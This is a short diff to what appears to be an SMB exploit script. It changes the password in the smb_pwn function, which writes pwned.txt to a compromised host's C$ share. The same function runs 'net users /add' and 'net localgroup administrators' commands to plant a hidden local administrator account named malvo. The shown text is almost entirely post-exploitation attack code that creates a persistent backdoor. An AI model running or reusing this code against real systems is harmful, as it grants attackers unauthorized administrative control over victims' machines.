@@ -972,13 +972,13 @@ def get_group_data_from_token(info, tokenData):
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
 
-	print('creating new admin malvo... password: therebedragonshere')
+	print('creating new admin malvo... password: P@ssword123')
 	tid2 = smbConn.connectTree('C$')
 	fid2 = smbConn.createFile(tid2, '/pwned.txt')
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
 	
-	service_exec(conn, r'net users /add malvo therebedragonshere')
+	service_exec(conn, r'net users /add malvo P@ssword123')
 	service_exec(conn, r'net localgroup administrators malvo /add')
 
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
